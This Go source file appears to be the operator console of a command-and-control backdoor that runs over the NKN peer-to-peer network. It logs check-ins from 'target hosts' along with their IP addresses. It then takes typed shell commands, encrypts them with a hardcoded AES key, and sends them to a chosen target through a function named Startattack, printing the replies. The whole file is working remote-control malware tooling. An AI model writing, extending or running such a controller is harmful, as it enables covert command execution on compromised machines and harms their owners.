package main

import (
	"../module/cipher"
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"flag"
	"fmt"
	nkn "github.com/nknorg/nkn-sdk-go"
	"log"
	"math/rand"
	"os"
	"strings"
	"time"
)

func main()  {
	seed := flag.String("g", "", "generate or input new seed")
	flag.Parse()
	if *seed == "new" {
		//生成随机数种子
		account, err := nkn.NewAccount(nil)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(hex.EncodeToString(account.Seed()))
		os.Exit(0)
	} else if *seed == ""{
		fmt.Println("Please enter your private seed")
	} else if len(*seed) != 64{
		fmt.Println("seed is illegal,need length is 64's seed")
	} else {
		go Startlisten(*seed)

		for {
			inputReader := bufio.NewReader(os.Stdin)
			inputext, err := inputReader.ReadString('\n')
			if err != nil {
				fmt.Println(err)
			}
			strarray := strings.Fields(strings.TrimSpace(inputext))
			var command string
			for i := 1; i < len(strarray); i++ {
				command = command + strarray[i] + " "
			}
			go Startattack(strarray[0], command)
		}
	}
}

func Startlisten(seedid string)  {
	err := func() error {
		seed, _ := hex.DecodeString(seedid)
		account, err := nkn.NewAccount(seed)
		if err != nil {
			return err
		}
		Listener, err := nkn.NewMultiClient(account, "monitor", 4, false, nknconfig)
		fmt.Println("your control id =",Listener.Address())
		if err != nil {
			return err
		}
		<-Listener.OnConnect.C
		for {
			msg := <-Listener.OnMessage.C
			log.Println("target host connect, ID:", msg.Src,",target IP address :",string(msg.Data))
			msg.Reply([]byte("OK"))
		}
	}()
	if err != nil {
		fmt.Println(err)
	}
}

func Startattack( goal string, command string){
	account, err := nkn.NewAccount(nil)
	if err != nil {
		log.Println(err)
	}
	Hunter, err := nkn.NewMultiClient(account, RandomID(), 4, false, nknconfig)
	if err != nil {
		log.Println(err)
	}
	defer Hunter.Close()
	<-Hunter.OnConnect.C
	encrycommand := AesEncode(command)
	onReply, err := Hunter.Send(nkn.NewStringArray(goal), encrycommand, nil)
	if err != nil {
		log.Println(err)
	}
	reply := <-onReply.C
	fmt.Println(string(reply.Data))
}

func RandomID() string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 32; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ctx := md5.New()
	ctx.Write(result)
	return hex.EncodeToString(ctx.Sum(nil))
}

func AesEncode(str string) []byte {
	encode, err := cipher.AesCbcEncrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		fmt.Println(err)
	}
	return encode
}

var nknconfig *nkn.ClientConfig

func init() {
	nknconfig = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              409600,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
	log.SetFlags(log.Ltime | log.Ldate)
}
